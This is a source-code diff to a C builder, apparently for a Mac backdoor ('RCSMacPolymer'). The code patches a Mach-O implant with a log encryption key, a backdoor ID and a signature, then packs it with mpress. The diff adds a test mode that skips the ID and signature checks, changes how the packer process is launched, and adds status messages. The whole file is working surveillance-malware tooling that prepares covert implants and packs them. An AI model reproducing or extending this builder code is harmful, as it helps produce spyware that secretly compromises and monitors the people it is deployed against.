@@ -16,6 +16,8 @@
 
 #include "RCSMacPolymer.h"
 
+//#define TEST_MODE
+
 
 HANDLE hMachoFile;
 HANDLE hMappedFile;
@@ -127,6 +129,7 @@ patchMachoFile ()
 
   // Patching log aes key
   MD5((const UCHAR *)szLogKey, strlen(szLogKey), (PUCHAR)md5Value);
+
   if (patchValue (pBlockPtr,
                   iLen,
                   (BYTE *)md5Value,
@@ -240,7 +243,7 @@ parseArguments (int argc, TCHAR **argv)
   //
   //  Sanity checks
   //
-  /*
+#ifndef TEST_MODE
   if (strlen(szBackdoorID) < strlen("RCS_0000000000"))
     {
       printf("[ee] Backdoor_id should be at least %d characters\n", strlen("RCS_0000000000"));
@@ -264,7 +267,8 @@ parseArguments (int argc, TCHAR **argv)
       printf("Backdoor signature should be at least %d characters\n", SIGNATURE_MARK_LEN);
       return kArgError;
     }
-  */
+#endif
+
   return kSuccess;
 }
 
@@ -283,7 +287,7 @@ usage (TCHAR *aBinaryName)
 
 int main (int argc, TCHAR *argv[])
 {
-  int iRet = kSuccess;
+  int iRet = -1;
 
   if (parseArguments (argc, argv) != kSuccess)
     {
@@ -298,25 +302,27 @@ int main (int argc, TCHAR *argv[])
 
       PROCESS_INFORMATION pi;
       STARTUPINFOA si;
-      
+      HANDLE tmpHandle;
+
       ZeroMemory(&si, sizeof(si));
       ZeroMemory(&pi, sizeof(pi));
       si.cb = sizeof(si);
       
       sprintf_s (params, sizeof(params), "mpress.exe -ub %s", szOutFilename);
-      if (CreateProcessA("mpress.exe", params, 0, 0, FALSE, CREATE_DEFAULT_ERROR_MODE, 0, 0, &si, &pi) == TRUE)
+      if (CreateProcessA(NULL, params, 0, 0, FALSE, CREATE_DEFAULT_ERROR_MODE, 0, 0, &si, &pi) == TRUE)
         {
+          printf("mpress ok\n");
           WaitForSingleObject(pi.hProcess, INFINITE);
 
           CloseHandle(pi.hProcess);
           CloseHandle(pi.hThread);
         }
-      
-      //ShellExecute(GetDesktopWindow(), "open", "mpress.exe", params, NULL, SW_SHOWNORMAL);
-      //Sleep(200);
-      sprintf_s (backupName, sizeof(backupName), "%s.bak", szOutFilename);
+      else
+        {
+          printf("mpress failed\n");
+        }
 
-      HANDLE tmpHandle;
+      sprintf_s (backupName, sizeof(backupName), "%s.bak", szOutFilename);
 
       if ((tmpHandle = CreateFileA(backupName, GENERIC_READ, FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) != INVALID_HANDLE_VALUE)
         {
